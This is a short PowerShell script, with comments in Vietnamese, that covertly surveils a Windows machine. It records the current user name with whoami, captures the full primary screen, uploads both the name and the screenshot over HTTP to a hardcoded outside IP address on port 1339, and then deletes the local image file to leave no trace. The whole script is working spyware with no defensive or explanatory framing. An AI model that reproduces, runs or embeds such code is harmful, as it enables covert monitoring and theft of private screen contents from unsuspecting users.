# Đường dẫn lưu ảnh chụp màn hình
$tempScreenshot = "$env:TEMP\screenshot.png"
$ServerUrl = "http://157.245.57.163:1339"
# Lấy tên máy
$name = whoami

# Chụp ảnh màn hình
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

$bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
$bitmap = New-Object System.Drawing.Bitmap $bounds.Width, $bounds.Height
$graphics = [System.Drawing.Graphics]::FromImage($bitmap)
$graphics.CopyFromScreen($bounds.Location, [System.Drawing.Point]::Empty, $bounds.Size)
$bitmap.Save($tempScreenshot, [System.Drawing.Imaging.ImageFormat]::Png)

# Kiểm tra biến $ServerUrl
if (-not $ServerUrl) {
    Write-Host "Server URL is not defined. Exiting."
    exit
}

# Gửi tên máy
try {
    $webClient = New-Object System.Net.WebClient
    $webClient.UploadString("$ServerUrl/name", $name)
} catch {
    Write-Host "Error uploading name: $_"
}

# Gửi ảnh chụp màn hình
try {
    $fileBytes = [System.IO.File]::ReadAllBytes($tempScreenshot)
    $webClient.UploadData("$ServerUrl/screenshot", $fileBytes)
} catch {
    Write-Host "Error uploading screenshot: $_"
}

# Xoá ảnh chụp màn hình
Remove-Item $tempScreenshot -ErrorAction SilentlyContinue
